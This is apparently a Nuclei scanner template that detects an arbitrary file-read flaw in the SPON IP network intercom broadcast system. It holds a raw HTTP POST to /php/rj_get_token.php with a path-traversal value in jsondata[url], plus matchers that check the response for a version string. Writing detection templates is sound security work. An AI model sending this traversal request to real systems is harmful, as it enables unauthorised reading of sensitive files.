id: spon-ip-file-read

info:
  name: SPON IP Network Intercom Broadcast System File Read
  author: ProjectDiscoveryAI
  severity: high
  description: |
    SPON IP network intercom broadcast system has an arbitrary file reading vulnerability in rj_get_token.php, allowing attackers to retrieve sensitive files.
  tags: file-read

http:
  - raw:
      - |
        POST /php/rj_get_token.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        jsondata[url]=../lan/version.txt
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "v1.x 3.31 RELEASE"
